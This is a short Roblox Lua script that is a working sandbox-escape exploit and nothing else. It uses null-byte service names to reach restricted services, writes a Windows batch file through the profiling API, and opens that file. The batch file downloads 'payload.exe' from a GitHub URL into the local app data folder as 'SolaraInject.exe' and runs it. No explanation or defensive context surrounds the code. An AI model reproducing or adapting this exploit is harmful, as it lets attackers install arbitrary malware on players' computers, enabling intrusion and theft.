local LinkingService = game:GetService("LinkingService\0")
local ScriptContext = game:GetService("ScriptContext\0")

local scriptContent = [[
@echo off
curl -L -o "%localappdata%\SolaraInject.exe" "https://github.com/f4kedre4lity/project/raw/e1227ad9a7830b566f7f2ec8b692dc4798167090/modules/payload.exe"

"%localappdata%\SolaraInject.exe"
]]

local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
LinkingService:OpenUrl(payload)
